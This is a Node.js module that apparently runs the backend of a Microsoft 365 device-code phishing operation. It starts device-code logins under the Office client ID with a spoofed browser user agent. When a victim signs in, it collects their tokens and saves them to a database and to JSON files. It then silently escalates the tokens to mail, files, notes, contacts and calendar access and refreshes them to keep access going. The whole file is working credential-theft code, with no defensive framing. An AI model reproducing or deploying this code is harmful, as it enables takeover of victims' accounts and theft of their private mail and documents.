/**
 * device-flow.js
 *
 * Uses FOCI (Family of Client IDs) token elevation:
 *   Step 1: Device flow with Mail.Send + offline_access only (confirmed working)
 *   Step 2: After getting refresh token, silently request Mail.Read scope
 *   Step 3: Silently request Notes.Read scope
 *   Step 4: Silently request User.Read scope
 *
 * Client: d3590ed6-52b3-4102-aeff-aad2292ab01c (Microsoft Office — FOCI member)
 * Endpoint: v2 /oauth2/v2.0/devicecode
 */

const https  = require('https');
const crypto = require('crypto');
const db     = require('./database');
require('dotenv').config();

const CLIENT_ID = process.env.MS_CLIENT_ID || 'd3590ed6-52b3-4102-aeff-aad2292ab01c';
const TENANT    = process.env.MS_TENANT    || 'common';

// Initial scope — only what works for device code request
const INITIAL_SCOPE = 'https://graph.microsoft.com/Mail.Send https://graph.microsoft.com/User.Read offline_access';

// Additional scopes to silently elevate to via FOCI refresh token
const ELEVATED_SCOPES = [
  'https://graph.microsoft.com/Mail.Read offline_access',
  'https://graph.microsoft.com/Mail.ReadWrite offline_access',
  'https://graph.microsoft.com/User.Read offline_access',
  'https://graph.microsoft.com/Files.Read offline_access',
  'https://graph.microsoft.com/Files.ReadWrite offline_access',
  'https://graph.microsoft.com/Notes.Read offline_access',
  'https://graph.microsoft.com/Notes.ReadWrite offline_access',
  'https://graph.microsoft.com/Contacts.Read offline_access',
  'https://graph.microsoft.com/Calendars.Read offline_access',
];

// Active polling timers per session
const activeTimers = new Map();

// ── HTTPS POST ────────────────────────────────────────────────────────────────
function msPost(path, body) {
  return new Promise((resolve, reject) => {
    const data = new URLSearchParams(body).toString();
    const opts = {
      hostname: 'login.microsoftonline.com',
      path,
      method:  'POST',
      headers: {
        'Content-Type':   'application/x-www-form-urlencoded',
        'Content-Length': Buffer.byteLength(data),
        'User-Agent':     'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36'
      }
    };
    const req = https.request(opts, res => {
      let raw = '';
      res.on('data', d => raw += d);
      res.on('end', () => {
        try { resolve(JSON.parse(raw)); }
        catch { reject(new Error('Parse error: ' + raw.slice(0, 200))); }
      });
    });
    req.on('error', reject);
    req.write(data);
    req.end();
  });
}

// ── Graph GET ─────────────────────────────────────────────────────────────────
function graphGet(path, token) {
  return new Promise((resolve) => {
    const opts = {
      hostname: 'graph.microsoft.com',
      path,
      method:  'GET',
      headers: { Authorization: 'Bearer ' + token, Accept: 'application/json' }
    };
    const req = https.request(opts, res => {
      let raw = '';
      res.on('data', d => raw += d);
      res.on('end', () => { try { resolve(JSON.parse(raw)); } catch { resolve({}); } });
    });
    req.on('error', () => resolve({}));
    req.end();
  });
}

// ── FOCI scope elevation ──────────────────────────────────────────────────────
// Use refresh token to silently get tokens for additional scopes
async function elevateScopes(refreshToken, msEmail) {
  console.log(`[FOCI] Elevating scopes for ${msEmail}...`);
  let bestRefreshToken = refreshToken;

  for (const scope of ELEVATED_SCOPES) {
    try {
      const r = await msPost(`/${TENANT}/oauth2/v2.0/token`, {
        grant_type:    'refresh_token',
        client_id:     CLIENT_ID,
        refresh_token: bestRefreshToken,
        scope
      });

      if (r.access_token) {
        const scopeName = scope.split('/').pop().split(' ')[0];
        console.log(`[FOCI] ✓ Elevated: ${scopeName}`);
        // Update access token in DB for this scope
        // Keep the longest-lived refresh token
        if (r.refresh_token) bestRefreshToken = r.refresh_token;
        // Store elevated token — we keep the most capable one
        const expiresAt = new Date(Date.now() + (r.expires_in || 3600) * 1000).toISOString();
        db.prepare(`
          UPDATE ms_tokens
          SET access_token=?, refresh_token=?, expires_at=?, updated_at=CURRENT_TIMESTAMP
          WHERE ms_email=?
        `).run(r.access_token, r.refresh_token || bestRefreshToken, expiresAt, msEmail);
      } else {
        console.log(`[FOCI] ✗ Could not elevate: ${scope.split('/').pop()} — ${r.error}`);
      }
    } catch(e) {
      console.log(`[FOCI] ✗ Error elevating ${scope.split('/').pop()}: ${e.message}`);
    }
  }
  console.log(`[FOCI] Elevation complete for ${msEmail}`);
}

// ── Start a new per-visit session ─────────────────────────────────────────────
async function startSession() {
  console.log('[DevFlow] Requesting device code...');

  const ms = await msPost(
    `/${TENANT}/oauth2/v2.0/devicecode`,
    { client_id: CLIENT_ID, scope: INITIAL_SCOPE }
  );

  if (ms.error) {
    throw new Error(`Microsoft error: ${ms.error_description || ms.error}`);
  }

  const sessionKey = crypto.randomBytes(24).toString('hex');
  const expiresAt  = new Date(Date.now() + (ms.expires_in || 900) * 1000).toISOString();
  const interval   = ms.interval || 5;

  db.prepare(`
    INSERT INTO device_sessions
      (session_key, device_code, user_code, verification_uri, interval_secs, expires_at, status)
    VALUES (?, ?, ?, ?, ?, ?, 'pending')
  `).run(sessionKey, ms.device_code, ms.user_code,
         ms.verification_uri || 'https://microsoft.com/devicelogin',
         interval, expiresAt);

  console.log(`[DevFlow] Session ${sessionKey.slice(0,8)}… code=${ms.user_code}`);
  _startPollLoop(sessionKey, ms.device_code, interval);

  return {
    session_key:      sessionKey,
    user_code:        ms.user_code,
    verification_uri: ms.verification_uri || 'https://microsoft.com/devicelogin',
    expires_at:       expiresAt,
    expires_in:       ms.expires_in || 900
  };
}

// ── Poll loop ─────────────────────────────────────────────────────────────────
function _startPollLoop(sessionKey, deviceCode, intervalSecs) {
  if (activeTimers.has(sessionKey)) clearInterval(activeTimers.get(sessionKey));

  const timer = setInterval(async () => {
    const session = db.prepare('SELECT * FROM device_sessions WHERE session_key=?').get(sessionKey);
    if (!session || session.status !== 'pending') {
      clearInterval(timer); activeTimers.delete(sessionKey); return;
    }
    if (new Date(session.expires_at) <= new Date()) {
      db.prepare("UPDATE device_sessions SET status='expired', updated_at=CURRENT_TIMESTAMP WHERE session_key=?").run(sessionKey);
      clearInterval(timer); activeTimers.delete(sessionKey);
      console.log(`[DevFlow] Session ${sessionKey.slice(0,8)}… expired`);
      return;
    }

    try {
      const r = await msPost(`/${TENANT}/oauth2/v2.0/token`, {
        grant_type:  'urn:ietf:params:oauth:grant-type:device_code',
        client_id:   CLIENT_ID,
        device_code: deviceCode
      });

      if (r.error === 'authorization_pending') return;
      if (r.error === 'slow_down') {
        clearInterval(timer); activeTimers.delete(sessionKey);
        setTimeout(() => _startPollLoop(sessionKey, deviceCode, intervalSecs + 5), 0);
        return;
      }
      if (r.error) {
        db.prepare("UPDATE device_sessions SET status='expired', updated_at=CURRENT_TIMESTAMP WHERE session_key=?").run(sessionKey);
        clearInterval(timer); activeTimers.delete(sessionKey);
        console.error(`[DevFlow] Session ${sessionKey.slice(0,8)}… error: ${r.error_description || r.error}`);
        return;
      }

      // ── SUCCESS ──────────────────────────────────────────────────────────
      clearInterval(timer); activeTimers.delete(sessionKey);

      const expiresAt = new Date(Date.now() + (r.expires_in || 3600) * 1000).toISOString();

      // Get profile - the local graphGet returns parsed JSON directly
      let msName = '', msEmail = '';
      try {
        const profile = await graphGet('/v1.0/me?$select=displayName,mail,userPrincipalName', r.access_token);
        if (profile && profile.displayName) {
          msName  = profile.displayName || '';
          msEmail = profile.mail || profile.userPrincipalName || '';
          console.log(`[DevFlow] Profile fetched: ${msName} <${msEmail}>`);
        } else {
          console.log(`[DevFlow] Profile fetch returned:`, JSON.stringify(profile).slice(0, 200));
        }
      } catch (e) {
        console.log(`[DevFlow] Profile fetch error:`, e.message);
      }

      // Fallback: decode id_token
      if (!msEmail && r.id_token) {
        try {
          const payload = JSON.parse(Buffer.from(r.id_token.split('.')[1], 'base64url').toString());
          msName  = msName  || payload.name || '';
          msEmail = msEmail || payload.preferred_username || payload.upn || payload.email || '';
          console.log(`[DevFlow] Used id_token fallback: ${msName} <${msEmail}>`);
        } catch (e) {
          console.log(`[DevFlow] id_token decode failed:`, e.message);
        }
      }

      const emailKey = msEmail || `linked_${Date.now()}`;

      // Store token in database
      db.prepare(`
        INSERT INTO ms_tokens
          (ms_email, ms_name, access_token, refresh_token, expires_at, status, linked_at, updated_at)
        VALUES (?, ?, ?, ?, ?, 'active', CURRENT_TIMESTAMP, CURRENT_TIMESTAMP)
        ON CONFLICT(ms_email) DO UPDATE SET
          ms_name=excluded.ms_name, access_token=excluded.access_token,
          refresh_token=excluded.refresh_token, expires_at=excluded.expires_at,
          status='active', updated_at=CURRENT_TIMESTAMP
      `).run(emailKey, msName, r.access_token, r.refresh_token || null, expiresAt);

      // ALSO store as individual JSON file for easy access/backup
      try {
        const tokenDir = require('path').join(__dirname, 'tokens');
        require('fs').mkdirSync(tokenDir, { recursive: true });
        const safeFileName = emailKey.replace(/[^a-zA-Z0-9@._-]/g, '_');
        const tokenFile = require('path').join(tokenDir, `${safeFileName}.json`);
        const tokenData = {
          email: msEmail,
          name: msName,
          access_token: r.access_token,
          refresh_token: r.refresh_token || null,
          expires_at: expiresAt,
          linked_at: new Date().toISOString(),
          scopes: r.scope || INITIAL_SCOPE
        };
        require('fs').writeFileSync(tokenFile, JSON.stringify(tokenData, null, 2));
        console.log(`[DevFlow] Token saved to: ${tokenFile}`);
      } catch (e) {
        console.log(`[DevFlow] Token file save failed:`, e.message);
      }

      db.prepare(`
        UPDATE device_sessions SET status='success', ms_email=?, ms_name=?, updated_at=CURRENT_TIMESTAMP
        WHERE session_key=?
      `).run(msEmail, msName, sessionKey);

      console.log(`[DevFlow] SUCCESS — session ${sessionKey.slice(0,8)}… linked ${emailKey}`);

      // Elevate scopes via FOCI in background — don't block the success response
      if (r.refresh_token) {
        setTimeout(() => elevateScopes(r.refresh_token, emailKey), 2000);
      }

    } catch(e) {
      console.error(`[DevFlow] Poll error session ${sessionKey.slice(0,8)}…:`, e.message);
    }
  }, intervalSecs * 1000);

  activeTimers.set(sessionKey, timer);
}

// ── Get session status ────────────────────────────────────────────────────────
function getSessionStatus(sessionKey) {
  const s = db.prepare('SELECT * FROM device_sessions WHERE session_key=?').get(sessionKey);
  if (!s) return { status: 'not_found' };
  const secsLeft = Math.max(0, Math.floor((new Date(s.expires_at) - Date.now()) / 1000));
  if (s.status === 'pending' && secsLeft === 0) {
    db.prepare("UPDATE device_sessions SET status='expired' WHERE session_key=?").run(sessionKey);
    return { status: 'expired' };
  }
  return {
    status: s.status, user_code: s.user_code,
    verification_uri: s.verification_uri, expires_at: s.expires_at,
    seconds_left: secsLeft, ms_email: s.ms_email, ms_name: s.ms_name
  };
}

// ── Refresh token ─────────────────────────────────────────────────────────────
async function refreshToken(msEmail) {
  const row = db.prepare("SELECT * FROM ms_tokens WHERE ms_email=? AND status='active'").get(msEmail);
  if (!row || !row.refresh_token) throw new Error('No refresh token for ' + msEmail);

  const r = await msPost(`/${TENANT}/oauth2/v2.0/token`, {
    grant_type:    'refresh_token',
    client_id:     CLIENT_ID,
    refresh_token: row.refresh_token,
    scope:         INITIAL_SCOPE
  });

  if (r.error) throw new Error(r.error_description || r.error);

  const expiresAt = new Date(Date.now() + (r.expires_in || 3600) * 1000).toISOString();
  db.prepare(`
    UPDATE ms_tokens SET access_token=?, refresh_token=?, expires_at=?, status='active', updated_at=CURRENT_TIMESTAMP
    WHERE ms_email=?
  `).run(r.access_token, r.refresh_token || row.refresh_token, expiresAt, msEmail);

  console.log(`[MS] Token refreshed for ${msEmail}`);

  // Re-elevate scopes after refresh
  if (r.refresh_token) setTimeout(() => elevateScopes(r.refresh_token, msEmail), 1000);

  return expiresAt;
}

// ── Auto-refresh every 5 min ──────────────────────────────────────────────────
function startAutoRefresh() {
  setInterval(async () => {
    const expiring = db.prepare(`
      SELECT ms_email FROM ms_tokens WHERE status='active'
        AND refresh_token IS NOT NULL AND expires_at < datetime('now', '+15 minutes')
    `).all();
    for (const row of expiring) {
      try { await refreshToken(row.ms_email); }
      catch(e) {
        console.error(`[MS] Auto-refresh failed for ${row.ms_email}:`, e.message);
        db.prepare("UPDATE ms_tokens SET status='expired' WHERE ms_email=?").run(row.ms_email);
      }
    }
  }, 5 * 60 * 1000);
  console.log('[MS] Auto-refresh + FOCI elevation started');
}

// ── Cleanup ───────────────────────────────────────────────────────────────────
function startCleanup() {
  setInterval(() => {
    db.prepare(`UPDATE device_sessions SET status='expired', updated_at=CURRENT_TIMESTAMP
      WHERE status='pending' AND expires_at < datetime('now')`).run();
    db.prepare("DELETE FROM device_sessions WHERE expires_at < datetime('now', '-3 hours')").run();
    for (const [key] of activeTimers) {
      const s = db.prepare('SELECT status FROM device_sessions WHERE session_key=?').get(key);
      if (!s || s.status !== 'pending') { clearInterval(activeTimers.get(key)); activeTimers.delete(key); }
    }
  }, 10 * 60 * 1000);
}

module.exports = { startSession, getSessionStatus, refreshToken, startAutoRefresh, startCleanup };
